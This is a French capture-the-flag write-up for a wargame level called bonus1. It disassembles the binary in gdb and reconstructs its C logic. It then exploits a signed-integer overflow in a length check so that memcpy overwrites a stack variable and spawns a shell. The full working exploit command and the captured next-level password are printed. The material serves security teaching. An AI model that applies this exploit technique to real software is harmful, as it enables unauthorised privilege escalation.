# Bonus1

On observe un exécutable à la racine : `bonus1`

```shell
$ ./bonus1
Segmentation fault (core dumped)

$ ./bonus1 "Hello World"

$ ./bonus1 "Hello" "World"
```

On cherche donc à comprendre ce que fait l'exécutable

```shell
$ gdb bonus1 -q
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:      push   ebp
   0x08048425 <+1>:      mov    ebp,esp
   0x08048427 <+3>:      and    esp,0xfffffff0
   0x0804842a <+6>:      sub    esp,0x40
   0x0804842d <+9>:      mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:     add    eax,0x4
   0x08048433 <+15>:     mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:     mov    DWORD PTR [esp],eax
   0x08048438 <+20>:     call   0x8048360 <atoi@plt>
   0x0804843d <+25>:     mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:     cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:     jle    0x804844f <main+43>
   0x08048448 <+36>:     mov    eax,0x1
   0x0804844d <+41>:     jmp    0x80484a3 <main+127>
   0x0804844f <+43>:     mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:     lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:     mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:     add    eax,0x8
   0x08048460 <+60>:     mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:     mov    edx,eax
   0x08048464 <+64>:     lea    eax,[esp+0x14]
   0x08048468 <+68>:     mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:     mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:     mov    DWORD PTR [esp],eax
   0x08048473 <+79>:     call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:     cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:     jne    0x804849e <main+122>
   0x08048482 <+94>:     mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:    mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:    mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:    call   0x8048350 <execl@plt>
   0x0804849e <+122>:    mov    eax,0x0
   0x080484a3 <+127>:    leave
   0x080484a4 <+128>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir une idée plus claire de `bonus1`

```shell
$ scp -P 4242 -r bonus1@192.168.56.102:/home/user/bonus1/bonus1 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage bonus1
```

_résultat sauvegardé dans [source.md](source.md)_

Notre objectif est de valider dans la condition `param1 == 0x574f4c46`.

Afin d'y parvenir, nous devons auparavant valider la condition `param1 < 10`

Il y a trois lignes importante dans cette executable

```C
if (param1 < 10) {
		memcpy(DestMem, param2, param1 * 4);
		if (param1 == 0x574f4c46) {
			...
		}
}
```

`DestMem` fait `40` octets et est suivi par `param1` sur la stack.
Nous pouvons donc, grace au `memcpy`, ecrire par dessus `param1`

`param1` doit valider la condition suivante `param1 < 10` et `param1 * 4 = 44`
(pour ecrire completement dans `DestMem` de taille `40` et ecrire sur note `param1` de taille `4`)

`param1` est un int. Nous pouvons donc utiliser cette propriete pour loop dans les nombres negatifs pour atteindre notre 44 tout en etant inferieur a 10

```shell
$ bc
44 - 2147483648 * 2
-4294967252

-4294967252 / 4
-1073741813
```

nous avons `param1 = -1073741813`, `param2` doit faire `40 octets + 4 octets` egal a `0x574f4c46`

Si l'on rassemble toute nos trouvaille

```shell
bonus1:$ ./bonus1 "-1073741813" `python -c 'print("A"*40 + "\x46\x4c\x4f\x57")'`
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
